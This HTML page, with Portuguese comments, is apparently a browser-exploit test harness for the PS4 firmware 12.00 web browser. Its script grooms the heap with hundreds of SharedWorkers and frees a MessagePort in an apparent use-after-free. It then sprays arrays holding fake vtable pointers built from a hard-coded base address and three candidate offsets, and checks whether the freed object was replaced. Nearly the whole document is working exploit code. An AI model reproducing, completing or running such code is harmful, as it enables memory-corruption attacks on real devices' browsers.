<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 VTABLE BRUTEFORCE</title>
    
</head>
<body>

    <h1>VTABLE BRUTEFORCE (Top 3 Candidates)</h1>
    <div id="controls"></div>
    <div id="log">Pronto.</div>

    <script>
        function log(msg, cls="") {
            var d = document.getElementById("log");
            d.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // CANDIDATOS EXTRAÍDOS
        const CANDIDATES = [
            0x2BB15A8n, 
            0x2BB2208n, 
            0x2E01C60n
        ];

        // Base Golden (A que deu Freeze antes)
        const BASE = 0x820000000n;

        // Tamanho Confirmado (0xC0 deu panic)
        const SIZE = 0xC0; 

        function build_payload(vtable_offset) {
            // Double Array Spray (Butterfly Heap)
            // 192 bytes total. 
            // Header Array = 16 bytes. 
            // Payload = 176 bytes / 8 = 22 elementos.
            var arr = new Array(22);
            
            // Endereço Real da VTable
            var vtable = BASE + vtable_offset;
            
            // Converte para Float
            var buf = new ArrayBuffer(8);
            var view = new DataView(buf);
            view.setBigUint64(0, vtable, true);
            var vtable_float = view.getFloat64(0, true);

            // Enche o objeto
            for(var i=0; i<arr.length; i++) arr[i] = vtable_float;
            return arr;
        }

        var workers_stash = [];

        async function run_test(idx) {
            var offset = CANDIDATES[idx];
            log(`>>> TESTANDO: 0x${offset.toString(16)} <<<`);
            
            var payload = build_payload(offset);

            // Grooming
            for(let i=0; i<380; i++) {
                try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // Trigger
            var count = 0;
            var it = setInterval(() => {
                if(count >= 23) { // 403
                    clearInterval(it);
                    
                    var v = workers_stash.pop();
                    var p = v.port;
                    v.port.close();
                    
                    var spray = [];
                    for(var k=0; k<30000; k++) spray.push(payload.slice(0));
                    
                    setTimeout(() => {
                        try {
                            var s = p.toString();
                            // Se não crashar e não for MessagePort -> Sucesso
                            if (s.indexOf("MessagePort") === -1) {
                                log("!!! SUCESSO !!!", "success");
                                alert("VTable Correta: 0x" + offset.toString(16));
                            } else {
                                log("Falha: Objeto intacto.");
                            }
                        } catch(e) {
                            log("Erro: " + e);
                        }
                        workers_stash.forEach(w=>{try{w.port.close()}catch(e){}});
                        workers_stash = [];
                    }, 500);
                    return;
                }
                try { workers_stash.push(new SharedWorker("data:text,1", "v"+count)); } catch(e){}
                count++;
            }, 50);
        }

        // UI
        var div = document.getElementById("controls");
        CANDIDATES.forEach((c, i) => {
            var b = document.createElement("button");
            b.innerText = `Testar 0x${c.toString(16)}`;
            b.onclick = () => run_test(i);
            div.appendChild(b);
        });
    </script>
</body>
</html>
